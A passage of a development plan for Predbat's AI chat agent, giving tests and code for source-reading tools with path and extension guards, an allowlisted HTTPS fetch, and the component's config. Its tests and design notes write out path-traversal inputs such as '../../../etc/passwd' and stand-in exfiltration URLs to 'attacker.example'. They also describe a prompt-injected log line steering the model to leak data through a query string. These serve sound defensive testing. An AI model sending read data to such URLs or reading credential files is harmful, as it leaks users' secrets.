            failed = True

        for hit in result.get("data") or []:
            if len(hit.get("text", "")) > 300:
                print("ERROR: a match line was not truncated: {} chars".format(len(hit["text"])))
                failed = True
            if "line" not in hit:
                print("ERROR: a match is missing its line number: {}".format(hit))
                failed = True

        capped = search_source("filler", max_results=2, root=root)
        if len(capped.get("data") or []) > 2:
            print("ERROR: max_results was ignored")
            failed = True
        if not capped.get("total_matches") or capped["total_matches"] <= 2:
            print("ERROR: total_matches did not report the truncation: {}".format(capped.get("total_matches")))
            failed = True

        scoped = search_source("marker_symbol", file="plan.py", root=root)
        if {hit["file"] for hit in scoped.get("data") or []} != {"plan.py"}:
            print("ERROR: the file argument did not scope the search: {}".format(scoped.get("data")))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_search_source_rejects_bad_patterns(my_predbat):
    """An over-long or uncompilable pattern is a clean error, never an exception."""
    failed = False
    print("**** Testing search_source pattern validation ****")
    root = _make_source_tree()
    try:
        long_pattern = search_source("x" * 500, root=root)
        if long_pattern.get("success"):
            print("ERROR: an over-long pattern was accepted")
            failed = True

        broken = search_source("marker_symbol[", root=root)
        if broken.get("success") or "regular expression" not in str(broken.get("error", "")).lower():
            print("ERROR: an uncompilable pattern did not report cleanly: {}".format(broken))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_read_source(my_predbat):
    """read_source returns a numbered slice, clamps its size, and reports the file length."""
    failed = False
    print("**** Testing read_source ****")
    root = _make_source_tree()
    try:
        result = read_source("plan.py", root=root)
        if not result.get("success"):
            print("ERROR: read_source failed on a real source file: {}".format(result.get("error")))
            failed = True
        if "calculate_plan" not in str(result.get("data", {}).get("lines", "")):
            print("ERROR: read_source did not return the file contents")
            failed = True
        if not result.get("data", {}).get("total_lines"):
            print("ERROR: read_source did not report total_lines, so the model cannot page")
            failed = True

        paged = read_source("plan.py", start_line=3, max_lines=2, root=root)
        lines = str(paged.get("data", {}).get("lines", "")).strip().splitlines()
        if len(lines) != 2:
            print("ERROR: paging returned {} lines, expected 2".format(len(lines)))
            failed = True
        elif not lines[0].strip().startswith("3"):
            print("ERROR: paging did not start at line 3: {!r}".format(lines[0]))
            failed = True

        clamped = read_source("plan.py", max_lines=99999, root=root)
        clamped_lines = str(clamped.get("data", {}).get("lines", "")).strip().splitlines()
        if len(clamped_lines) > 400:
            print("ERROR: max_lines was not clamped, got {} lines".format(len(clamped_lines)))
            failed = True

        if read_source("prediction_kernel.cpp", root=root).get("success") is not True:
            print("ERROR: read_source refused a C++ source file")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_read_source_refuses_everything_it_should(my_predbat):
    """The extension allowlist and path containment keep config, logs and the token cache out."""
    failed = False
    print("**** Testing read_source access guards ****")
    root = _make_source_tree()
    try:
        forbidden = ["apps.yaml", "secrets.yaml", "predbat.log", "old_plan.py.bak", "kernel.so", "cache/chat_token.json", "../../../etc/passwd", "/etc/passwd", "venv/lib/dependency.py", "__pycache__/cached.py"]
        for target in forbidden:
            result = read_source(target, root=root)
            if result.get("success"):
                print("ERROR: read_source returned contents for {} - this is a credential leak path".format(target))
                failed = True
            elif not result.get("error"):
                print("ERROR: read_source refused {} without saying why".format(target))
                failed = True

        outside = os.path.join(tempfile.mkdtemp(prefix="predbat_out_"), "escaped.py")
        with open(outside, "w", encoding="utf-8") as handle:
            handle.write("secret = 'outside the source root'\n")
        link = os.path.join(root, "escaped.py")
        try:
            os.symlink(outside, link)
        except (OSError, NotImplementedError):
            print("Info: symlinks unavailable on this platform, skipping the symlink case")
        else:
            if read_source("escaped.py", root=root).get("success"):
                print("ERROR: a symlink pointing outside the source root was followed")
                failed = True

        try:
            resolve_source_path("apps.yaml", root=root)
            print("ERROR: resolve_source_path accepted a .yaml path")
            failed = True
        except SourceAccessError:
            pass
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed
```

Extend the driver:

```python
def run_chat_tools_tests(my_predbat):
    """Run every chat-only tool test, returning True if any of them failed."""
    failed = False
    failed |= test_chat_tool_defs_shape(my_predbat)
    failed |= test_score_documents(my_predbat)
    failed |= test_search_docs_uses_the_cache(my_predbat)
    failed |= test_search_source(my_predbat)
    failed |= test_search_source_rejects_bad_patterns(my_predbat)
    failed |= test_read_source(my_predbat)
    failed |= test_read_source_refuses_everything_it_should(my_predbat)
    return failed
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_3.txt 2>&1; grep -iE "ImportError|cannot import|ERROR|failed" /tmp/chat_tools_3.txt | head -20
```

Expected: FAIL with `ImportError: cannot import name 'search_source' from 'chat_tools'`.

- [ ] **Step 3: Implement the source tools**

Add `import os` and `import time` to `chat_tools.py`'s imports, then append:

```python
# Source access. The allowlist is an extension rule rather than a directory rule on purpose:
# CONFIG_ROOTS falls back to "./" (const.py:33) and the Storage cache lives at config_root/cache
# (storage.py:199), so apps.yaml, secrets.yaml, predbat.log and cached OAuth tokens can all sit
# inside the directory being searched. Only an extension rule excludes them on every install.
SOURCE_EXTENSIONS = (".py", ".cpp", ".h", ".hpp", ".proto", ".sh", ".md")
SOURCE_SKIP_DIRS = {"venv", "__pycache__", ".git", "cache", "node_modules", ".om_live_cache"}
SOURCE_MAX_RESULTS = 100
SOURCE_MAX_LINES = 400
SOURCE_MAX_BYTES = 65536
SOURCE_MATCH_LINE_MAX = 300
SOURCE_PATTERN_MAX = 200
SOURCE_SCAN_SECONDS = 5.0


class SourceAccessError(ValueError):
    """Raised when a source path is outside the install directory or not an allowed type."""


def source_root():
    """Return the directory Predbat is installed in - the same one the app reads itself from."""
    return os.path.dirname(os.path.abspath(__file__))


def resolve_source_path(relative, root=None):
    """Resolve a caller-supplied path inside the source root, or raise SourceAccessError.

    realpath is used on both sides so a symlink pointing out of the tree fails containment, not
    just a literal '..' in the path.
    """
    root = os.path.realpath(root or source_root())
    candidate = os.path.realpath(os.path.join(root, str(relative or "")))
    if candidate != root and not candidate.startswith(root + os.sep):
        raise SourceAccessError("'{}' is outside the Predbat install directory".format(relative))
    if os.path.splitext(candidate)[1].lower() not in SOURCE_EXTENSIONS:
        raise SourceAccessError("'{}' is not a source file - only {} can be read".format(relative, ", ".join(SOURCE_EXTENSIONS)))
    parts = os.path.relpath(candidate, root).split(os.sep)
    if any(part in SOURCE_SKIP_DIRS for part in parts):
        raise SourceAccessError("'{}' is inside a directory that is not part of Predbat's source".format(relative))
    if not os.path.isfile(candidate):
        raise SourceAccessError("'{}' does not exist".format(relative))
    return candidate


def _iter_source_files(root):
    """Yield (relative_path, absolute_path) for every readable source file under root."""
    for directory, subdirectories, filenames in os.walk(root):
        subdirectories[:] = [name for name in subdirectories if name not in SOURCE_SKIP_DIRS and not name.startswith(".")]
        for filename in filenames:
            if os.path.splitext(filename)[1].lower() not in SOURCE_EXTENSIONS:
                continue
            absolute = os.path.join(directory, filename)
            yield os.path.relpath(absolute, root), absolute


def search_source(pattern, file=None, max_results=20, root=None):
    """Search Predbat's installed source for a regular expression."""
    root = os.path.realpath(root or source_root())
    if not isinstance(pattern, str) or not pattern:
        return {"success": False, "error": "'pattern' must be a non-empty string", "data": None}
    if len(pattern) > SOURCE_PATTERN_MAX:
        return {"success": False, "error": "'pattern' is longer than {} characters".format(SOURCE_PATTERN_MAX), "data": None}
    try:
        expression = re.compile(pattern, re.IGNORECASE)
    except re.error as error:
        return {"success": False, "error": "'pattern' is not a valid regular expression: {}".format(error), "data": None}

    limit = max(1, min(int(max_results or 20), SOURCE_MAX_RESULTS))
    if file:
        try:
            absolute = resolve_source_path(file, root=root)
        except SourceAccessError as error:
            return {"success": False, "error": str(error), "data": None}
        targets = [(os.path.relpath(absolute, root), absolute)]
    else:
        targets = _iter_source_files(root)

    hits = []
    total = 0
    truncated_scan = False
    started = time.monotonic()
    for relative, absolute in targets:
        if time.monotonic() - started > SOURCE_SCAN_SECONDS:
            truncated_scan = True
            break
        try:
            with open(absolute, "r", encoding="utf-8", errors="replace") as handle:
                for number, line in enumerate(handle, start=1):
                    if expression.search(line):
                        total += 1
                        if len(hits) < limit:
                            hits.append({"file": relative, "line": number, "text": line.rstrip("\n")[:SOURCE_MATCH_LINE_MAX]})
        except (IOError, OSError):
            continue

    result = {"success": True, "error": None, "data": hits, "total_matches": total, "description": "Matches in Predbat's installed source, which is the exact version running"}
    if truncated_scan:
        result["description"] += " (scan stopped after {} seconds, results are partial)".format(SOURCE_SCAN_SECONDS)
    return result


def read_source(file, start_line=1, max_lines=200, root=None):
    """Read a numbered slice of one Predbat source file."""
    try:
        path = resolve_source_path(file, root=root)
    except SourceAccessError as error:
        return {"success": False, "error": str(error), "data": None}

    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            lines = handle.readlines()
    except (IOError, OSError) as error:
        return {"success": False, "error": "Could not read '{}': {}".format(file, error), "data": None}

    first = max(1, int(start_line or 1))
    count = max(1, min(int(max_lines or 200), SOURCE_MAX_LINES))
    window = lines[first - 1 : first - 1 + count]

    rendered = []
    size = 0
    for offset, line in enumerate(window):
        entry = "{:>6}  {}".format(first + offset, line.rstrip("\n"))
        size += len(entry) + 1
        if size > SOURCE_MAX_BYTES:
            rendered.append("... truncated at {} bytes, read again from line {} for more".format(SOURCE_MAX_BYTES, first + offset))
            break
        rendered.append(entry)

    return {"success": True, "error": None, "data": {"file": os.path.relpath(path, os.path.realpath(root or source_root())), "start_line": first, "total_lines": len(lines), "lines": "\n".join(rendered)}, "description": "A slice of Predbat's installed source"}
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_4.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_tools_4.txt | head -30
```

Expected: PASS. Pay particular attention to `test_read_source_refuses_everything_it_should` — every line it prints is a credential leak path.

- [ ] **Step 5: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat_tools.py apps/predbat/tests/test_chat_tools.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): let the agent search and read its own installed source

Local rather than GitHub, because the installed files are the exact
version the user is running - an answer drawn from main about code they
are not running is worse than no answer.

Access is gated on an extension allowlist rather than a directory,
because CONFIG_ROOTS falls back to ./ and the Storage cache lives at
config_root/cache, so apps.yaml, secrets.yaml, predbat.log and cached
OAuth tokens can all sit in the directory being searched."
```

---

## Task 5: Allowlisted URL fetch

`fetch_url` is the only tool that can send data outward to an address the model chooses. The
risk is exfiltration more than SSRF: a prompt-injected log line could steer the model into
`GET https://attacker.example/?d=<what it just read>`. The allowlist is the control that closes
that, and it must never be widened to a wildcard.

**Files:**
- Modify: `apps/predbat/chat_tools.py`
- Modify: `apps/predbat/tests/test_chat_tools.py`

**Interfaces:**
- Consumes: `chat_tools` from Tasks 3 and 4.
- Produces:
  - `chat_tools.DEFAULT_FETCH_ALLOWLIST = ("springfall2008.github.io", "github.com", "raw.githubusercontent.com")`
  - `chat_tools.FETCH_MAX_BYTES = 204800`, `FETCH_TIMEOUT_SECONDS = 20`, `FETCH_MAX_REDIRECTS = 3`
  - `chat_tools.FetchRefusedError(ValueError)`
  - `chat_tools.host_allowed(host, allowlist) -> bool`
  - `chat_tools.validate_fetch_target(url, allowlist, resolver=None) -> str` — raises `FetchRefusedError`
  - `async chat_tools.fetch_url(url, allowlist=None, resolver=None) -> dict`
  - `chat_tools.html_to_text(html) -> str`

- [ ] **Step 1: Write the failing tests**

Append to `apps/predbat/tests/test_chat_tools.py`, adding `from chat_tools import DEFAULT_FETCH_ALLOWLIST, FetchRefusedError, host_allowed, html_to_text, validate_fetch_target` to its imports:

```python
def _resolver(address):
    """Return a fake DNS resolver that maps every hostname to one address."""

    def resolve(host):
        """Pretend every hostname resolves to the configured address."""
        return [address]

    return resolve


def test_host_allowlist(my_predbat):
    """Exact hosts and their subdomains pass; lookalike hosts must not."""
    failed = False
    print("**** Testing fetch host allowlist ****")
    allowed = ["springfall2008.github.io", "github.com"]
    for host in ["springfall2008.github.io", "github.com", "docs.github.com"]:
        if not host_allowed(host, allowed):
            print("ERROR: {} should be allowed".format(host))
            failed = True
    for host in ["evilspringfall2008.github.io", "github.com.attacker.example", "notgithub.com", "attacker.example", ""]:
        if host_allowed(host, allowed):
            print("ERROR: {} was allowed - substring matching would be an exfiltration hole".format(host))
            failed = True
    return failed


def test_validate_fetch_target(my_predbat):
    """Scheme, allowlist and resolved-address rules all refuse before any request is made."""
    failed = False
    print("**** Testing fetch target validation ****")
    allowlist = list(DEFAULT_FETCH_ALLOWLIST)
    public = _resolver("140.82.121.4")

    try:
        validate_fetch_target("https://github.com/springfall2008/batpred", allowlist, resolver=public)
    except FetchRefusedError as error:
        print("ERROR: a legitimate GitHub URL was refused: {}".format(error))
        failed = True

    refusals = [
        ("http://github.com/x", "plain http"),
        ("ftp://github.com/x", "a non-http scheme"),
        ("https://attacker.example/x", "an off-allowlist host"),
        ("not a url", "a malformed url"),
    ]
    for url, why in refusals:
        try:
            validate_fetch_target(url, allowlist, resolver=public)
            print("ERROR: {} was accepted ({})".format(url, why))
            failed = True
        except FetchRefusedError:
            pass

    for address, why in [("127.0.0.1", "loopback"), ("192.168.1.10", "private"), ("169.254.169.254", "link-local metadata"), ("0.0.0.0", "unspecified"), ("::1", "IPv6 loopback")]:
        try:
            validate_fetch_target("https://github.com/x", allowlist, resolver=_resolver(address))
            print("ERROR: an allowlisted host resolving to {} ({}) was accepted".format(address, why))
            failed = True
        except FetchRefusedError:
            pass

    return failed


def test_html_to_text(my_predbat):
    """Script and style bodies are dropped, tags stripped, entities decoded."""
    failed = False
    print("**** Testing html_to_text ****")
    text = html_to_text("<html><head><style>p{color:red}</style><script>var secret=1;</script></head><body><h1>Title</h1><p>Hello &amp; welcome</p></body></html>")
    for banned in ["var secret", "color:red", "<p>", "<script"]:
        if banned in text:
            print("ERROR: html_to_text leaked {!r}: {!r}".format(banned, text))
            failed = True
    if "Title" not in text or "Hello & welcome" not in text:
        print("ERROR: html_to_text lost the readable content: {!r}".format(text))
        failed = True
    return failed


def test_fetch_url_refusals_are_results(my_predbat):
    """A refused fetch comes back as a tool result naming the rule, never as an exception."""
    failed = False
    print("**** Testing fetch_url refusal reporting ****")
    result = asyncio.run(chat_tools.fetch_url("https://attacker.example/steal?d=secret", resolver=_resolver("93.184.216.34")))
    if result.get("success"):
        print("ERROR: fetch_url fetched an off-allowlist host")
        failed = True
    if not result.get("error"):
        print("ERROR: fetch_url refused without naming a reason: {}".format(result))
        failed = True

    result = asyncio.run(chat_tools.fetch_url("https://github.com/x", allowlist=["github.com"], resolver=_resolver("10.0.0.5")))
    if result.get("success"):
        print("ERROR: fetch_url reached a private address through an allowlisted host")
        failed = True

    return failed
```

Extend the driver with the four new tests:

```python
    failed |= test_host_allowlist(my_predbat)
    failed |= test_validate_fetch_target(my_predbat)
    failed |= test_html_to_text(my_predbat)
    failed |= test_fetch_url_refusals_are_results(my_predbat)
```

- [ ] **Step 2: Run the tests to verify they fail**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_5.txt 2>&1; grep -iE "ImportError|cannot import|ERROR" /tmp/chat_tools_5.txt | head -20
```

Expected: FAIL with `ImportError: cannot import name 'host_allowed' from 'chat_tools'`.

- [ ] **Step 3: Implement the fetch guards**

Add `import asyncio`, `import ipaddress`, `import socket` and extend the urllib import to
`from urllib.parse import urljoin, urlparse` in `chat_tools.py`, then append:

```python
# fetch_url is the one tool that sends data to an address the model picks, so it is fenced by an
# allowlist rather than by blocklisting bad destinations. See spec section 7.3.
DEFAULT_FETCH_ALLOWLIST = ("springfall2008.github.io", "github.com", "raw.githubusercontent.com")
FETCH_MAX_BYTES = 204800
FETCH_TIMEOUT_SECONDS = 20
FETCH_MAX_REDIRECTS = 3
FETCH_CONTENT_TYPES = ("text/", "application/json", "application/xhtml")


class FetchRefusedError(ValueError):
    """Raised when a URL fails the scheme, allowlist or resolved-address checks."""


def host_allowed(host, allowlist):
    """Return whether a hostname is the allowlisted host itself or a subdomain of it.

    Matching is exact or dot-anchored, never a substring: 'evilspringfall2008.github.io' contains
    an allowlisted host as a substring but is a different site entirely.
    """
    host = (host or "").strip().lower().rstrip(".")
    if not host:
        return False
    for allowed in allowlist or []:
        allowed = str(allowed).strip().lower().rstrip(".")
        if not allowed:
            continue
        if host == allowed or host.endswith("." + allowed):
            return True
    return False


def _default_resolver(host):
    """Resolve a hostname to the list of addresses it points at."""
    return [info[4][0] for info in socket.getaddrinfo(host, 443, proto=socket.IPPROTO_TCP)]


def validate_fetch_target(url, allowlist, resolver=None):
    """Check one URL against every fetch rule, returning it, or raise FetchRefusedError."""
    parsed = urlparse(str(url or ""))
    if parsed.scheme != "https":
        raise FetchRefusedError("only https URLs can be fetched, got '{}'".format(parsed.scheme or url))
    if not parsed.hostname:
        raise FetchRefusedError("'{}' is not a valid URL".format(url))
    if not host_allowed(parsed.hostname, allowlist):
        raise FetchRefusedError("'{}' is not on the fetch allowlist ({})".format(parsed.hostname, ", ".join(allowlist)))

    try:
        addresses = (resolver or _default_resolver)(parsed.hostname)
    except (socket.gaierror, OSError) as error:
        raise FetchRefusedError("could not resolve '{}': {}".format(parsed.hostname, error))
    if not addresses:
        raise FetchRefusedError("'{}' did not resolve to any address".format(parsed.hostname))

    for address in addresses:
        try:
            parsed_address = ipaddress.ip_address(str(address).split("%")[0])
        except ValueError:
            raise FetchRefusedError("'{}' resolved to an address that could not be parsed".format(parsed.hostname))
        if parsed_address.is_private or parsed_address.is_loopback or parsed_address.is_link_local or parsed_address.is_reserved or parsed_address.is_multicast or parsed_address.is_unspecified:
            raise FetchRefusedError("'{}' resolves to the internal address {}, which cannot be fetched".format(parsed.hostname, parsed_address))
    return url


def html_to_text(html):
    """Reduce an HTML document to readable text, dropping script and style bodies first."""
    text = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", str(html or ""))
    text = re.sub(r"(?is)<br\s*/?>|</p>|</div>|</li>|</h[1-6]>", "\n", text)
    text = re.sub(r"(?s)<[^>]+>", " ", text)
    for entity, character in (("&amp;", "&"), ("&lt;", "<"), ("&gt;", ">"), ("&quot;", '"'), ("&#39;", "'"), ("&nbsp;", " ")):
        text = text.replace(entity, character)
    lines = [" ".join(line.split()) for line in text.splitlines()]
    return "\n".join(line for line in lines if line)


async def fetch_url(url, allowlist=None, resolver=None):
    """Fetch an allowlisted page as text, re-validating every redirect hop."""
    allowlist = list(allowlist or DEFAULT_FETCH_ALLOWLIST)
    target = url
    timeout = aiohttp.ClientTimeout(total=FETCH_TIMEOUT_SECONDS)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for hop in range(FETCH_MAX_REDIRECTS + 1):
                validate_fetch_target(target, allowlist, resolver=resolver)
                async with session.get(target, allow_redirects=False) as response:
                    if response.status in (301, 302, 303, 307, 308):
                        location = response.headers.get("Location")
                        if not location:
                            return {"success": False, "error": "redirect from '{}' had no destination".format(target), "data": None}
                        if hop >= FETCH_MAX_REDIRECTS:
                            return {"success": False, "error": "too many redirects from '{}'".format(url), "data": None}
                        target = urljoin(target, location)
                        continue
                    if response.status != 200:
                        return {"success": False, "error": "'{}' returned HTTP {}".format(target, response.status), "data": None}

                    content_type = (response.headers.get("Content-Type") or "").lower()
                    if not any(content_type.startswith(prefix) for prefix in FETCH_CONTENT_TYPES):
                        return {"success": False, "error": "'{}' is {}, which is not text".format(target, content_type or "an unknown type"), "data": None}

                    body = await response.content.read(FETCH_MAX_BYTES + 1)
                    truncated = len(body) > FETCH_MAX_BYTES
                    text = body[:FETCH_MAX_BYTES].decode("utf-8", errors="replace")
                    if "html" in content_type:
                        text = html_to_text(text)
                    if truncated:
                        text += "\n\n... truncated at {} bytes".format(FETCH_MAX_BYTES)
                    return {"success": True, "error": None, "data": {"url": target, "content_type": content_type, "text": text, "truncated": truncated}, "description": "Fetched page content"}
            return {"success": False, "error": "too many redirects from '{}'".format(url), "data": None}
    except FetchRefusedError as error:
        return {"success": False, "error": "Refused: {}".format(error), "data": None}
    except (aiohttp.ClientError, asyncio.TimeoutError) as error:
        return {"success": False, "error": "Could not fetch '{}': {}".format(target, error), "data": None}
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat_tools > /tmp/chat_tools_6.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_tools_6.txt | head -30
```

Expected: PASS with no `ERROR:` lines.

- [ ] **Step 5: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat_tools.py apps/predbat/tests/test_chat_tools.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add an allowlisted URL fetch tool

Scheme, host allowlist, resolved-address and per-hop redirect checks,
with a content-type filter and a 200KB cap. The allowlist is dot-anchored
rather than a substring match, so evilspringfall2008.github.io does not
pass as the documentation site.

These guards exist for exfiltration specifically: a prompt-injected log
line could otherwise steer the model into putting what it just read in a
URL query string."
```

---

## Task 6: The chat component — config, gating, snapshot, event buffer

**Files:**
- Create: `apps/predbat/chat.py`
- Create: `apps/predbat/tests/test_chat.py`
- Modify: `apps/predbat/config.py`
- Modify: `apps/predbat/components.py`
- Modify: `apps/predbat/unit_test.py`

**Interfaces:**
- Consumes: `agent_tools.PredbatTools`, `openai_tool_list`, `TOOL_DEFS` (Task 1); `chat_store.ConversationStore`, `trim_history`, `derive_title` (Task 2); `chat_tools.CHAT_TOOL_DEFS` and the four tool functions (Tasks 3-5); `ComponentBase` from `apps/predbat/component_base.py`.
- Produces:
  - `chat.ChatAgent(ComponentBase)` with `initialize(api_key, model, base_url, max_tokens, max_tool_calls, max_history, max_conversations, expiry_days, turn_timeout, fetch_allowlist)`
  - `chat.build_snapshot(base) -> str`
  - `chat.ChatBusyError(RuntimeError)`
  - `ChatAgent.emit(conversation_id, event_type, data) -> int`
  - `ChatAgent.events_since(cursor, conversation_id) -> (list[dict], int, bool)` — events, next cursor, `reload_needed`
  - `ChatAgent.store: ConversationStore`, `ChatAgent.active: dict | None`, `ChatAgent.loop: asyncio.AbstractEventLoop | None`
  - `async ChatAgent.run_on_agent_loop(coro)` — the cross-thread bridge
  - `ChatAgent._release_stale_turn()` — frees a turn slot whose coroutine was killed
  - `chat.AgentNotReadyError(RuntimeError)`
  - `chat.EVENT_BUFFER_MAX = 2000

# How long past its own deadline a turn must go before its slot is assumed abandoned. Only a
# component restart can strand a slot, and that is rare - so the grace period is generous.
STALE_TURN_GRACE_SECONDS = 60`

- [ ] **Step 1: Add the configuration**

In `apps/predbat/config.py`, add to `APPS_SCHEMA` (near the other top-level service keys, after `"web_port"`):

```python
    "openrouter_api_key": {"type": "string", "empty": False},
    "openrouter_model": {"type": "string", "empty": False},
    "openrouter_base_url": {"type": "string", "empty": False},
    "openrouter_max_tokens": {"type": "integer"},
    "chat_max_tool_calls": {"type": "integer"},
    "chat_max_history": {"type": "integer"},
    "chat_max_conversations": {"type": "integer"},
    "chat_expiry_days": {"type": "integer"},
    "chat_turn_timeout": {"type": "integer"},
    "chat_fetch_allowlist": {"type": "string_list"},
```

and to `CONFIG_ITEMS`, beside the other switches (after the `set_read_only` entry at `config.py:1135`):

```python
    {
        "name": "chat_confirm_writes",
        "friendly_name": "Chat confirm before changing settings",
        "type": "switch",
        "default": True,
    },
    {
        "name": "chat_web_search",
        "friendly_name": "Chat web search (costs per request)",
        "type": "switch",
        "default": False,
    },
```

- [ ] **Step 2: Register the component**

In `apps/predbat/components.py`, add `from chat import ChatAgent` beside the other component imports, and add to `COMPONENT_LIST` after the `"mcp"` entry:

```python
    "chat": {
        "class": ChatAgent,
        "name": "AI Chat Agent",
        "can_restart": True,
        "phase": 1,
        "args": {
            "api_key": {"required": True, "config": "openrouter_api_key"},
            "model": {"required": True, "config": "openrouter_model"},
            "base_url": {"required": False, "config": "openrouter_base_url", "default": "https://openrouter.ai/api/v1"},
            "max_tokens": {"required": False, "config": "openrouter_max_tokens", "default": 0},
            "max_tool_calls": {"required": False, "config": "chat_max_tool_calls", "default": 8},
            "max_history": {"required": False, "config": "chat_max_history", "default": 40},
            "max_conversations": {"required": False, "config": "chat_max_conversations", "default": 20},
            "expiry_days": {"required": False, "config": "chat_expiry_days", "default": 30},
            "turn_timeout": {"required": False, "config": "chat_turn_timeout", "default": 180},
            "fetch_allowlist": {"required": False, "config": "chat_fetch_allowlist", "default": None},
        },
    },
```

`required: True` on the first two is the whole gating mechanism: without both an API key and a model, `Components.initialize()` never constructs the component, and it already logs a targeted warning when only one is set (`apps/predbat/components.py:75-82`).

- [ ] **Step 3: Write the failing test**

Create `apps/predbat/tests/test_chat.py` with the house header, then:

```python
"""Tests for the chat agent component.

Drives ChatAgent against a fake OpenRouter that replays canned SSE byte streams, so the agentic
loop, the tool dispatch and the confirmation gate are all exercised without a network or a model.
"""

import asyncio

from chat import EVENT_BUFFER_MAX, ChatAgent, build_snapshot
from components import COMPONENT_LIST


def _make_agent(my_predbat, **overrides):
    """Build a ChatAgent bound to my_predbat without going through ComponentBase.__init__."""
    agent = ChatAgent.__new__(ChatAgent)
    agent.base = my_predbat
    agent.log = my_predbat.log
    agent.prefix = my_predbat.prefix
    agent.args = my_predbat.args
    agent.count_errors = 0
    agent.api_started = False
    agent.api_stop = False
    settings = {"api_key": "test-key", "model": "test/model", "base_url": "https://openrouter.example/api/v1", "max_tokens": 0, "max_tool_calls": 4, "max_history": 40, "max_conversations": 20, "expiry_days": 30, "turn_timeout": 30, "fetch_allowlist": None}
    settings.update(overrides)
    agent.initialize(**settings)
    return agent


def test_component_gating(my_predbat):
    """The chat component is gated on the API key and the model being present."""
    failed = False
    print("**** Testing chat component gating ****")
    entry = COMPONENT_LIST.get("chat")
    if entry is None:
        print("ERROR: 'chat' is not registered in COMPONENT_LIST")
        return True

    for name in ("api_key", "model"):
        if not entry["args"].get(name, {}).get("required"):
            print("ERROR: '{}' is not required, so the component would start unconfigured".format(name))
            failed = True
    for name in ("base_url", "max_tool_calls", "max_history", "max_conversations", "expiry_days", "turn_timeout", "fetch_allowlist", "max_tokens"):
        if entry["args"].get(name, {}).get("required"):
            print("ERROR: '{}' is required, which would stop the component starting on a default install".format(name))
            failed = True
    if entry["args"]["api_key"]["config"] != "openrouter_api_key" or entry["args"]["model"]["config"] != "openrouter_model":
        print("ERROR: the gating args are not bound to the documented apps.yaml keys")
        failed = True
    if not entry.get("can_restart"):
        print("ERROR: the chat component should be restartable from the Components tab")
        failed = True

    return failed


def test_build_snapshot(my_predbat):
    """The snapshot names the live figures and survives missing state."""
    failed = False
    print("**** Testing the live snapshot ****")
    snapshot = build_snapshot(my_predbat)
    if not isinstance(snapshot, str) or not snapshot.strip():
        print("ERROR: build_snapshot returned nothing useful")
        return True

    for label in ["SOC", "Predbat"]:
        if label.lower() not in snapshot.lower():
            print("ERROR: snapshot is missing {!r}:\n{}".format(label, snapshot))
            failed = True
    if len(snapshot) > 6000:
        print("ERROR: snapshot is {} characters, which would dominate every turn".format(len(snapshot)))
        failed = True

    class Sparse:
        """A base with almost nothing set, standing in for a half-started Predbat."""

        prefix = "predbat"
        args = {}

        def get_arg(self, name, default=None, **kwargs):
            """Return the default for every argument."""
            return default

        def get_ha_config(self, name, default):
            """Return the default for every config item."""
            return default, False

    try:
        sparse = build_snapshot(Sparse())
    except Exception as error:
        print("ERROR: build_snapshot raised on sparse state: {}".format(error))
        return True
    if not sparse.strip():
        print("ERROR: build_snapshot returned nothing for sparse state")
        failed = True

    return failed


def test_event_buffer(my_predbat):
    """Events are sequenced, filtered by conversation, and signal a reload when outrun."""
    failed = False
    print("**** Testing the chat event buffer ****")
    agent = _make_agent(my_predbat)

    agent.emit("aaaa", "delta", {"text": "one"})
    agent.emit("bbbb", "delta", {"text": "two"})
    agent.emit(None, "busy", {"conversation_id": "aaaa", "title": "t", "turn_id": 1})

    events, cursor, reload_needed = agent.events_since(0, "aaaa")
    kinds = [event["type"] for event in events]
    if kinds != ["delta", "busy"]:
        print("ERROR: conversation filtering returned {}, expected the conversation event plus the global one".format(kinds))
        failed = True
    if reload_needed:
        print("ERROR: a fresh cursor should not ask for a reload")
        failed = True
    if cursor != agent.event_seq:
        print("ERROR: returned cursor {} does not match the buffer head {}".format(cursor, agent.event_seq))
        failed = True

    later, _, _ = agent.events_since(cursor, "aaaa")
    if later:
        print("ERROR: replaying from the head returned {} stale events".format(len(later)))
        failed = True

    for index in range(EVENT_BUFFER_MAX + 50):
        agent.emit("aaaa", "delta", {"text": str(index)})
    if len(agent.events) > EVENT_BUFFER_MAX:
        print("ERROR: the event buffer grew to {}, cap is {}".format(len(agent.events), EVENT_BUFFER_MAX))
        failed = True
    _, _, reload_needed = agent.events_since(1, "aaaa")
    if not reload_needed:
        print("ERROR: a cursor older than the buffer did not ask for a reload")
        failed = True

    return failed


def run_chat_tests(my_predbat):
    """Run every chat agent test, returning True if any of them failed."""
    failed = False
    failed |= test_component_gating(my_predbat)
    failed |= test_build_snapshot(my_predbat)
    failed |= test_event_buffer(my_predbat)
    return failed
```

Register it in `apps/predbat/unit_test.py` with `from tests.test_chat import run_chat_tests` and:

```python
        ("chat", run_chat_tests, "Chat agent component, snapshot and event buffer tests", False),
```

- [ ] **Step 4: Run the test to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_1.txt 2>&1; grep -iE "ModuleNotFound|ImportError|ERROR" /tmp/chat_1.txt | head -20
```

Expected: FAIL with `ModuleNotFoundError: No module named 'chat'`.

